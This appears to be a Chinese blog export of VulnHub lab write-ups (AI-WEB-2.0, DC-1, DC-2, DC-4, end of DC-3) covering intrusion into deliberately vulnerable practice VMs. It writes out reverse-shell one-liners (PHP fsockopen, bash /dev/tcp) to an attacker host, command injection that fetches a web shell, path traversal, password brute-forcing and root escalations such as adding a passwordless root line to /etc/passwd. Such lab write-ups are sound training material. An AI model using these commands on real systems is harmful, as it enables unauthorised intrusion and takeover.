<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip 39772.zip  <span class="comment">#解压29772.zip文件</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> 39772</span><br><span class="line"></span><br><span class="line">tar -xvf exploit.tar  <span class="comment">#解压exploit提权脚本tar包</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/26/vulnhub-DC-3/27.png" alt="clipboard.png"></p>
<p>编译代码</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">./compile.sh</span>   <span class="comment">#执行脚本，编译文件</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/26/vulnhub-DC-3/28.png" alt="clipboard.png"></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">./doubleput</span>  <span class="comment">#执行提权文件</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/26/vulnhub-DC-3/29.png" alt="clipboard.png"></p>
<p>获得root权限</p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机AI-WEB-2.0</title>
    <url>/2020/03/23/AI-WEB-2.0/</url>
    <content><![CDATA[<p><strong>vulnhub靶机AI-WEB-2.0</strong></p>
<p><strong>工具，知识点：</strong></p>
<blockquote>
<p>netdiscover<br>nmap<br>dirsearch<br>searchsploit<br>john<br>目录穿越(Directory Traversal)漏洞<br>远程命令执行(RCE)漏洞</p>
</blockquote>
<a id="more"></a>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>先扫描靶机ip</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>靶机ip为192.168.211.146<br><img src="/2020/03/23/AI-WEB-2.0/1.png" alt><br>扫描主机端口</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.146</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/23/AI-WEB-2.0/2.png" alt><br>靶机开放了22端口和80端口，访问一下80端口<br>发现是一个简单的登录框，注册登录后文件共享页面<br><img src="/2020/03/23/AI-WEB-2.0/3.png" alt><br>先扫描一下网站目录</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">dirb <span class="string">http:</span><span class="comment">//192.168.211.146/userpage.php</span></span><br><span class="line">dirb <span class="string">http:</span><span class="comment">//192.168.211.146/</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/23/AI-WEB-2.0/4.png" alt><br>发现了一些目录，但是基本都无法利用<br>然后对网站进行指纹扫描</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">whatweb <span class="string">http:</span><span class="comment">//192.168.211.146</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/23/AI-WEB-2.0/5.png" alt><br>并没有什么发现</p>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><h2 id="目录穿越获取后台账户密码"><a href="#目录穿越获取后台账户密码" class="headerlink" title="目录穿越获取后台账户密码"></a>目录穿越获取后台账户密码</h2><p>使用Google搜索了一下<code>XuezhuLi FileSharing</code>发现这是个漏洞，然后在searchsploit里面搜索一下，然后cp到桌面。<img src="/2020/03/23/AI-WEB-2.0/6.png" alt><br>使用里面的payload可以读取文件<br><img src="/2020/03/23/AI-WEB-2.0/7.png" alt><br>发现了两个用户名<code>aiweb2</code>、<code>n0nr00tuser</code><br>然后包含一下apache2的认证文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">211.146</span><span class="regexp">/viewing.php?file_name=../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc<span class="regexp">/apache2/</span>.htpasswd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/23/AI-WEB-2.0/8.png" alt><br>发现了其中一个用户的密码，破解后为c.ronaldo<br>这里爆破了很久，发现不能使用John自带的字典，使用/usr/share/wordlists/rockyou.txt要快很多</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">john hash.txt --wordlist=<span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/23/AI-WEB-2.0/9.png" alt><br>然后我们在最开始爆破目录的时候，发现了webdmin，进去后是一个ftp登录框，我们使用我们爆破出的密码登录<br><img src="/2020/03/23/AI-WEB-2.0/10.png" alt><br><img src="/2020/03/23/AI-WEB-2.0/11.png" alt><br>看一下他的robots.txt，发现了两个目录，依次访问，发现了一个可以ping的目录<br><img src="/2020/03/23/AI-WEB-2.0/12.png" alt><br>这种在dvwa和一些ctf题中很常见，可以尝试一下是否又命令执行</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> || whoami</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/23/AI-WEB-2.0/13.png" alt><br>接着尝试反弹shell，但是好像过滤了一些特殊符号，但是我们可以尝试使用wget命令从kali上面下载一个反弹shell的php文件<br>现在kali上面写一个反弹shell的文件，将其放在网站根目录下，开启apache2，或者打开80端口<code>python -m SimpleHTTPServer 80</code></p>
<p><code>xxx&lt;?php $sock=fsockopen(&quot;192.168.211.135&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);?&gt;aaa</code></p>
<p><s>然后使用wget下载到靶机上<code>127.0.0.1 || wget http://192.168.211.135/shell3.php</code>，kali监听1234端口，靶机访问该文件</s></p>
<p><s>但是发现这个不好反弹，于是我们使用kali里的菜刀连接<br>weevely  generate   123456   shell3.php<br>密码：123456<br>脚本文件名：shell1.php<br>这个在DC-3里面也提到过<br>上传上去后，使用weevely连接<br>weevely <a href="http://192.168.211.146/webadmin/H05Tpin9555/shell3.php" target="_blank" rel="noopener">http://192.168.211.146/webadmin/H05Tpin9555/shell3.php</a> 123456</s><br>试了一下，妈的也不行，接下来就只有试一下一句话。<br>也没成功，md不弹了<br>查看一下隐藏文件<code>ls -al</code><br>但是无法正常识别-la 参数，只能看到一个 index.html文件，用 find命令试一下 ip=127.0.0.1|find . -type f /var/www/html/webadmin/S0mextras/</p>
<p><img src="/2020/03/23/AI-WEB-2.0/14.png" alt></p>
<p>惊讶的发现了一个隐藏文件，看上去应该像是ssh用户和密码，读取一下<code>127.0.0.1 || cat /var/www/html/webadmin/S0mextras/.sshUserCred55512.txt</code></p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">User:</span> n0nr00tuser</span><br><span class="line"><span class="symbol">Cred:</span> zxowieoi4sdsadpEClDws1sf</span><br></pre></td></tr></table></figure>

<p>接着用ssh连接一下<code>ssh n0nr00tuser@192.168.211.146</code>，成功</p>
<p><img src="/2020/03/23/AI-WEB-2.0/15.png" alt></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><code>sudo -l</code>没有什么发现<br>下载<a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a>到靶机，以搜集一些信息用于提权</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">chmod <span class="number">777</span> <span class="module-access"><span class="module"><span class="identifier">LinEnum</span>.</span></span>sh</span><br><span class="line">./<span class="module-access"><span class="module"><span class="identifier">LinEnum</span>.</span></span>sh -r report.txt</span><br></pre></td></tr></table></figure>

<p>因为输出内容太多，所以将结果保存到文件中，然后使用命令<code>less report.txt</code>查看</p>
<p>发现了一个lxd<img src="/2020/03/23/AI-WEB-2.0/16.png" alt><br>搜索一下<code>searchsploit lxd</code><br>下载到靶机之后，给予可执行权限<code>chmod +x 46978.sh</code>，运行之后报错，因为这个脚本是在Windows系统里进行编辑的，不同系统之间的编码格式不一致，所以导致了这样的问题。查看脚本后，发现还需要下载另一个文件lxd-alpine-builder</p>
<p><img src="/2020/03/23/AI-WEB-2.0/17.png" alt></p>
<p>下载完成后再kali里面运行</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">chmod 777 <span class="keyword">build</span>-alpine</span><br><span class="line">./<span class="keyword">build</span>-alpine</span><br></pre></td></tr></table></figure>

<p>脚本运行成功后会在同目录下生成一个压缩文件<code>alpine-v3.10-x86_64-20190919_2303.tar.gz</code>。将这个压缩文件与之前的脚本<code>46978.sh</code>放于靶机的同目录下执行便可获得root</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">./<span class="number">46978</span><span class="selector-class">.sh</span> -f alpine-v3.<span class="number">10</span>-x86_64-<span class="number">20190919</span>_2303<span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure>

<p>这里弄了很久i也没有成功，先放一放，等以后再回来看看</p>
<p>参考链接：<br><a href="https://blog.csdn.net/weixin_44214107/article/details/100979450" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44214107/article/details/100979450</a></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机DC-1</title>
    <url>/2020/02/15/vulnhub-DC-1/</url>
    <content><![CDATA[<p> <strong>vulnhub靶机DC-1</strong></p>
<p><strong>知识点:</strong></p>
<blockquote>
<p>1、msf的熟练使用以及搜索可利用漏洞（Drupal);</p>
<p>2、留意目标网站的配置文件（慢慢查看别错过重要信息）;</p>
<p>3、数据库管理员提权（更新管理员密码或者添加一个新用户）;</p>
<p>4、suid提权的命令（nmap、vim、find、bash、more、less、nano、cp）</p>
</blockquote>
<a id="more"></a>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>1.启动DC1靶机发现没有登录密码<img src="/2020/02/15/vulnhub-DC-1/1.png" alt="img"><br>2.信息收集<br>主机发现，由于是与主机nat连接，所以需要找到dc1的IP地址<br>dc1的Mac地址是<br><img src="/2020/02/15/vulnhub-DC-1/2.png" alt="img"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/15/vulnhub-DC-1/3.png" alt="img"></p>
<p>所以dc1 靶机的ip地址是192.168.211.133<br>扫描主机上开启的服务</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.133</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/15/vulnhub-DC-1/4.png" alt="img"></p>
<p>发现目标开启了22端口和80端口</p>
<p>22端口考虑ssh爆破</p>
<p>我们访问80端口发现是一个Drupal网站</p>
<p><img src="/2020/02/15/vulnhub-DC-1/5.png" alt="img"></p>
<p>drupal是三大PHP CMS 之一：drupal  WordPress Joomla 由于是开源的网站，所以应该有很多公开的漏洞</p>
<p> 扫描网站目录</p>
<p>dirb 192.168.211.133</p>
<p><img src="/2020/02/15/vulnhub-DC-1/6.png" alt="img"></p>
<p>我们查看网站的robots.txt</p>
<p><img src="/2020/02/15/vulnhub-DC-1/7.png" alt="img"></p>
<p>发现有一个更新信息，进去查看</p>
<p><img src="/2020/02/15/vulnhub-DC-1/8.png" alt="img"></p>
<p>发现了网站版本</p>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>我们进入msf中搜索drupal</p>
<p><img src="/2020/02/15/vulnhub-DC-1/9.png" alt="img"></p>
<p>然后使用exploit/unix/webapp/drupal_drupalgeddon2 攻击模块</p>
<p><img src="/2020/02/15/vulnhub-DC-1/10.png" alt="img"></p>
<p>与我们的网版本一样所以有可能攻击成功</p>
<p>设置好相关选项</p>
<p><img src="/2020/02/15/vulnhub-DC-1/11.png" alt="img"></p>
<p>查看可以使用的payload，使用反向连接</p>
<p><img src="/2020/02/15/vulnhub-DC-1/12.png" alt="img"></p>
<p>ls之后看到flag1.txt</p>
<p><img src="/2020/02/15/vulnhub-DC-1/13.png" alt="img"></p>
<p>提示config配置文件，百度找了一下durpal配置文件在/sites/default/settings.php</p>
<p><img src="/2020/02/15/vulnhub-DC-1/14.png" alt="img"></p>
<p>由于数据库密码是以明文方式写在配置文件里面的，所以考虑去找数据库的配置文件</p>
<p><img src="/2020/02/15/vulnhub-DC-1/15.png" alt="img"></p>
<p>发现flag2和数据库的密码信息，提示爆破和目录攻击不是一个好的方法</p>
<p><img src="/2020/02/15/vulnhub-DC-1/16.png" alt="img"></p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">array</span> (</span><br><span class="line"></span><br><span class="line">​      <span class="symbol">'database'</span> =&gt; <span class="symbol">'drupaldb'</span>,</span><br><span class="line"></span><br><span class="line">​      <span class="symbol">'username'</span> =&gt; <span class="symbol">'dbuser'</span>,</span><br><span class="line"></span><br><span class="line">​      <span class="symbol">'password'</span> =&gt; <span class="symbol">'R0ck3t'</span>,</span><br><span class="line"></span><br><span class="line">​      <span class="symbol">'host'</span> =&gt; <span class="symbol">'localhost'</span>,</span><br></pre></td></tr></table></figure>

<p>然后我们使用shell 获得普通用户权限，然后尝试去连接数据库</p>
<p><img src="/2020/02/15/vulnhub-DC-1/17.png" alt="img"></p>
<p>使用netstat -anptl查看3306是否开放，结果只允许本地连接</p>
<p><img src="/2020/02/15/vulnhub-DC-1/18.png" alt="img"></p>
<p>我们需要使用shell反弹</p>
<p>先用kali监听2333端口</p>
<p><img src="/2020/02/15/vulnhub-DC-1/19.png" alt="img"></p>
<p><strong>执行</strong></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>

<p>执行完之后可获得python提供的标准shell</p>
<p><img src="/2020/02/15/vulnhub-DC-1/20.png" alt="img"></p>
<p>shell反弹命令</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span><span class="number">.211</span><span class="number">.129</span>/<span class="number">2333</span>  <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>反弹成功</p>
<p><img src="/2020/02/15/vulnhub-DC-1/21.png" alt="img"></p>
<p>这时就可以使用mysql登陆，</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">mysql</span> -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/15/vulnhub-DC-1/22.png" alt="img"></p>
<p>show databases;</p>
<p><img src="/2020/02/15/vulnhub-DC-1/23.png" alt="img"></p>
<p>use drupaldb;</p>
<p>show tables;</p>
<p><img src="/2020/02/15/vulnhub-DC-1/24.png" alt="img"></p>
<p>查看users表select * from users/G</p>
<p><img src="/2020/02/15/vulnhub-DC-1/25.png" alt="img"></p>
<p>应该注意到的是密码的加密是用了该cms特有的hash算法。找hash文件。</p>
<p><img src="/2020/02/15/vulnhub-DC-1/26.png" alt="img"></p>
<p>scripts录有password-hash.sh文件。思路为用该文件生成自己的密码hash值替换数据库hash，达到登陆后台的目的。</p>
<p>php scripts/password-hash.sh asdfg    在www下使用scripts/password-hash.sh文件生成asdfg密码的密文</p>
<p><img src="/2020/02/15/vulnhub-DC-1/27.png" alt="img"></p>
<p>修改密文</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">update<span class="built_in"> users </span><span class="builtin-name">set</span>  <span class="attribute">pass</span>=<span class="string">"<span class="variable">$S</span><span class="variable">$D</span>.l7VkAj.1NbdBM6U7qPaNap3etnOwQpT9TTJ.VECdBHS/XTDUYd"</span> where <span class="attribute">uid</span>=1;</span><br></pre></td></tr></table></figure>

<p>修改成功</p>
<p><img src="/2020/02/15/vulnhub-DC-1/28.png" alt="img"></p>
<p>然后我们成功登陆网站并且发现flag3</p>
<p><img src="/2020/02/15/vulnhub-DC-1/29.png" alt="img"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>flag3将我们指向passwd，并且提示可以用find提权</p>
<p><img src="/2020/02/15/vulnhub-DC-1/30.png" alt="img"></p>
<p>查看/etc/passwd发现flag4</p>
<p><img src="/2020/02/15/vulnhub-DC-1/31.png" alt="img"></p>
<p>在home目录下发现flag4</p>
<p><img src="/2020/02/15/vulnhub-DC-1/32.png" alt="img"></p>
<p>接下来我们要进行提权进入到root</p>
<p>系统内核提权</p>
<p>提权之前我们需要看系统中是否有一些命令具有SUID标识—如果命令有SUID标识，说明这些命令在执行过程中会有短暂的root权限</p>
<p>查看具有SUID权限的命令</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">find / -perm <span class="number">-4000</span> <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/15/vulnhub-DC-1/33.png" alt="img"></p>
<p>发现上面 这些命令在执行时都会短暂获得root权限，我们使用这些命令去执行另一些命令，那么那些命令也相应具有端在的root权限</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">find</span> flag4.txt -exec <span class="string">"/bin/sh"</span> \;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/15/vulnhub-DC-1/34.png" alt="img"></p>
<p>发现flag5</p>
<p><img src="/2020/02/15/vulnhub-DC-1/35.png" alt="img"></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机DC-2</title>
    <url>/2020/02/16/vulnhub-DC-2/</url>
    <content><![CDATA[<p>​                                 <strong>vulnhub靶机DC-2</strong></p>
<p><strong>知识点：</strong></p>
<blockquote>
<p>nmap扫描<br>hydra爆破<br>cewl密码生成<br>git提权</p>
</blockquote>
<a id="more"></a>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>和DC1一样，先主机发现找到靶机的ip<br>使用nmap</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/16/vulnhub-DC-2/1.png" alt="clipboard.png"></p>
<p>根据MAC地址可以确定靶机的ip为192.168.211.134</p>
<p>然后扫描该ip所开放的端口服务</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.134</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/16/vulnhub-DC-2/2.png" alt="clipboard.png"></p>
<p>目标开放了80端口和7744端口，7744端口上是ssh，80端口的web页面需要修改hosts才能访<strong>/etc/hosts   需要本地dns解析</strong></p>
<p><img src="/2020/02/16/vulnhub-DC-2/3.png" alt="clipboard.png"></p>
<p>Windows下hosts文件路径</p>
<p><img src="/2020/02/16/vulnhub-DC-2/4.png" alt="clipboard.png"></p>
<p>成功访问该网站并且得到flag1，提示我们使用cewl</p>
<p><img src="/2020/02/16/vulnhub-DC-2/5.png" alt="clipboard.png"></p>
<p>该网站是由WordPress写的</p>
<p><img src="/2020/02/16/vulnhub-DC-2/6.png" alt="clipboard.png"></p>
<p>cewl（这个工具会自动爬取网站，并根据网站关键字生成字典）</p>
<p>使用方法 ：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">cewl dc<span class="number">-2</span> &gt;pwd.dic</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/16/vulnhub-DC-2/7.png" alt="clipboard.png"></p>
<p>由于是个网站，我们进行网站目录扫描</p>
<p>使用msf对网站进行扫描</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">search</span> scanner/http/<span class="keyword">dir</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/16/vulnhub-DC-2/8.png" alt="clipboard.png"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/scanner/<span class="keyword">http</span>/dir_scanner</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/16/vulnhub-DC-2/9.png" alt="clipboard.png"></p>
<p>成功扫描到两个目录</p>
<p><img src="/2020/02/16/vulnhub-DC-2/10.png" alt="clipboard.png"></p>
<p>进行访问，但是没多大帮助</p>
<p><img src="/2020/02/16/vulnhub-DC-2/11.png" alt="clipboard.png"></p>
<p>然后我们使用工具wpscan</p>
<p> 更新：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">wpscan <span class="comment">--update</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/16/vulnhub-DC-2/12.png" alt="clipboard.png"></p>
<p><img src="/2020/02/16/vulnhub-DC-2/13.png" alt="clipboard.png"></p>
<p><img src="/2020/02/16/vulnhub-DC-2/14.png" alt="clipboard.png"></p>
<p><strong>扫描网站</strong></p>
<p>对于WordPress网站，可以使用wp-scan进行扫描</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">wpscan <span class="comment">--url dc-2 -e</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/16/vulnhub-DC-2/15.png" alt="clipboard.png"></p>
<p>然后获取WordPress里面的用户账号</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">wpscan <span class="comment">--url dc-2 -e u</span></span><br></pre></td></tr></table></figure>

<p>​        发现有三个用户</p>
<p><img src="/2020/02/16/vulnhub-DC-2/16.png" alt="clipboard.png"></p>
<p>将这三个用户名写入一个字典中用来爆破</p>
<p><img src="/2020/02/16/vulnhub-DC-2/17.png" alt="clipboard.png"></p>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>然后我们进入网站后台</p>
<p><img src="/2020/02/16/vulnhub-DC-2/18.png" alt="clipboard.png"></p>
<p>爆破出来两个</p>
<p><img src="/2020/02/16/vulnhub-DC-2/19.png" alt="clipboard.png"></p>
<p>登陆Jerry的之后发现flag2</p>
<p><img src="/2020/02/16/vulnhub-DC-2/20.png" alt="clipboard.png"></p>
<p>由于前面发现开放了7744端口为ssh端口，所以我们可以尝试使用刚才的字典进行ssh端口爆破</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">hydra -L user<span class="selector-class">.txt</span> -P pwd<span class="selector-class">.dic</span> ssh:<span class="comment">//192.168.211.134 -s 7744</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/16/vulnhub-DC-2/21.png" alt="clipboard.png"></p>
<p>然后使用tom和parturient登陆</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ssh <span class="symbol">tom@</span><span class="number">192.168</span><span class="number">.211</span><span class="number">.134</span> -p <span class="number">7744</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/16/vulnhub-DC-2/22.png" alt="clipboard.png"></p>
<p>登陆成功，并且发现flag3，但是我们并不能查看</p>
<p><img src="/2020/02/16/vulnhub-DC-2/23.png" alt="clipboard.png"></p>
<p>遇到了-rbash限制，所以我们要绕过rbash</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">导入<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">BASH_CMDS[a]=<span class="regexp">/bin/bash</span>;a</span><br><span class="line"></span><br><span class="line">export PATH=<span class="regexp">/usr/sbin</span><span class="symbol">:/usr/bin</span><span class="symbol">:/sbin</span><span class="symbol">:/bin</span></span><br></pre></td></tr></table></figure>

<p>这样我们就成功访问了flag3.txt</p>
<p><img src="/2020/02/16/vulnhub-DC-2/24.png" alt="clipboard.png"></p>
<p>flag3将我们指向jerry，</p>
<p><img src="/2020/02/16/vulnhub-DC-2/25.png" alt="clipboard.png"></p>
<p>发现Jerry为/bin/bash/说明可以登陆</p>
<p>su jerry</p>
<p><img src="/2020/02/16/vulnhub-DC-2/26.png" alt="clipboard.png"></p>
<p>在home目录下发现flag4</p>
<p><img src="/2020/02/16/vulnhub-DC-2/27.png" alt="clipboard.png"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>但是我们还不是root用户，接下来就要用到git提权</p>
<p>sudo git –help让我们git参数强制进入到交互模式</p>
<p><img src="/2020/02/16/vulnhub-DC-2/28.png" alt="clipboard.png"></p>
<p>sudo git -p –help强制进入交互模式后再调用bash进入root权限</p>
<p><img src="/2020/02/16/vulnhub-DC-2/29.png" alt="clipboard.png"></p>
<p>最后在root目录下发现flag5</p>
<p><img src="/2020/02/16/vulnhub-DC-2/30.png" alt="clipboard.png"></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机DC-4</title>
    <url>/2020/03/01/vulnhub-DC-4/</url>
    <content><![CDATA[<p><strong>vulnhub靶机DC-4</strong></p>
<p><strong>知识点：</strong></p>
<blockquote>
<p>nmap<br>hydra<br>命令注入漏洞<br>teehee具有root权限时提权</p>
</blockquote>
<a id="more"></a>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>1.使用nmap扫描主机ip<br>nmap -sP 192.168.211.1/24<br><img src="/2020/03/01/vulnhub-DC-4/1.gif" alt="clipboard.png"></p>
<p>目标靶机的ip为192.168.211.137<br>2.扫描目标靶机开放的端口服务<br>nmap -A 192.168.211.137 -p 1-65535<br><img src="/2020/03/01/vulnhub-DC-4/2.gif" alt="clipboard.png"></p>
<p>目标靶机开放了22端口和80端口<br>我们在浏览器上访问80端口<br><img src="/2020/03/01/vulnhub-DC-4/3.gif" alt="clipboard.png"><br>发现一个admin登录框</p>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>尝试使用burp爆破，首先找到kali里面的字典文件并下载到本地<br>由于社区版burp不能设置线程，很慢，所以使用hydra</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P password<span class="selector-class">.lst</span> <span class="number">192.168</span>.<span class="number">211.137</span> http-post-<span class="selector-tag">form</span> <span class="string">"/login.php:username=^USER^&amp;password=^PASS^:S=logout"</span> -F</span><br></pre></td></tr></table></figure>

<p>得出密码为happy</p>
<p><img src="/2020/03/01/vulnhub-DC-4/4.gif" alt="clipboard.png"><br>登录之后发现有一个可执行命令的界面，抓包看看命令是怎样被执行的<br><img src="/2020/03/01/vulnhub-DC-4/5.gif" alt="clipboard.png"><br>发现执行的命令可以修改，输入whoami，命令成功被执行<br><img src="/2020/03/01/vulnhub-DC-4/6.gif" alt="clipboard.png"><br>所以存在一个命令注入漏洞<br><img src="/2020/03/01/vulnhub-DC-4/7.gif" alt="clipboard.png"></p>
<p>在/home/jim/backups目录下发现一个密码文件<br><img src="/2020/03/01/vulnhub-DC-4/8.gif" alt="clipboard.png"></p>
<p>查看该密码文件，将其复制出来</p>
<p><img src="/2020/03/01/vulnhub-DC-4/9.gif" alt="clipboard.png"></p>
<p>在etc/passwd下发现有三个用户，jim，sam，charles，将其放入一个文件夹中，由于开放了22端口，所以我们可以使用hydra爆破</p>
<p><img src="/2020/03/01/vulnhub-DC-4/10.gif" alt="clipboard.png"></p>
<p>得出jim的登陆密码为jibril04</p>
<p><img src="/2020/03/01/vulnhub-DC-4/11.gif" alt="clipboard.png"></p>
<p> ssh <a href="mailto:jim@192.168.211.137" target="_blank" rel="noopener">jim@192.168.211.137</a>  使用ssh登陆</p>
<p><img src="/2020/03/01/vulnhub-DC-4/12.gif" alt="clipboard.png"></p>
<p>在Mbox中发现了一封邮件</p>
<p><img src="/2020/03/01/vulnhub-DC-4/13.gif" alt="clipboard.png"></p>
<p>然后在/var/mail/中发现了</p>
<p><img src="/2020/03/01/vulnhub-DC-4/14.gif" alt="clipboard.png"></p>
<p>找到charles的密码为^xHhA&amp;hvim0y，使用ssh登陆</p>
<p><img src="/2020/03/01/vulnhub-DC-4/15.gif" alt="clipboard.png"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>但是没有什么线索，我们尝试提权</p>
<p>sudo -l</p>
<p><img src="/2020/03/01/vulnhub-DC-4/16.gif" alt="clipboard.png"></p>
<p>发现teehee命令sudo是不需要密码</p>
<p><img src="/2020/03/01/vulnhub-DC-4/17.gif" alt="clipboard.png"></p>
<p>查看该命令的帮助</p>
<p><img src="/2020/03/01/vulnhub-DC-4/18.gif" alt="clipboard.png"></p>
<p>teehee -a 在文件后面追加内容但是不覆盖</p>
<p>我们可以尝试在/etc/passwd文件下添加新的用户使这个用户具有root权限</p>
<p>abc::0:0:::/bin/bash</p>
<p>用户名：是否有密码保护：uid(root)：全称：家目录：登陆状态</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"asd::0:0:::/bin/bash"</span> | sudo teehee -a <span class="string">/etc/passwd</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/01/vulnhub-DC-4/19.gif" alt="clipboard.png"></p>
<p>写入成功</p>
<p><img src="/2020/03/01/vulnhub-DC-4/20.gif" alt="clipboard.png"></p>
<p>su asd 之后成功变成root用户，成功得到flag<br><img src="/2020/03/01/vulnhub-DC-4/21.gif" alt="clipboard.png"></p>
]]></content>
      <tags>
